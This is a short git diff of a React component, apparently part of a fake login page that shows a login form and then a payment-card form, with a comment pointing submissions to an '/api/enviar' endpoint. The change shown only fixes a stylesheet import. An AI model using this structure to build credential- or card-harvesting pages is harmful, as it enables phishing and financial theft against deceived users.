@@ -1,7 +1,7 @@
 import React, { useState } from "react";
 import Login from "./componentsLoginfalso/Login";
 import TarjetaPago from "./componentsLoginfalso/Tarjeta"; // Importa tu formulario de tarjeta
-import './Iniciar.module.css';
+import style from './Iniciar.module.css';
 
 export default function LoginFalso() {
   const [isLoginForm, setIsLoginForm] = useState(true); // Estado para alternar formularios
@@ -16,8 +16,7 @@ export default function LoginFalso() {
 
   return (
  // URL = dominio/api/enviar         Al hacer click y que todo este bien
-
-    <div className="styles.loginfalso">
+    <div className={style.loginfalso}>
       {isLoginForm ? <Login onLoginSuccess={handleLoginSuccess} /> :    <TarjetaPago onPaymentSuccess={onPaymentSuccess} />}
     </div>
   );
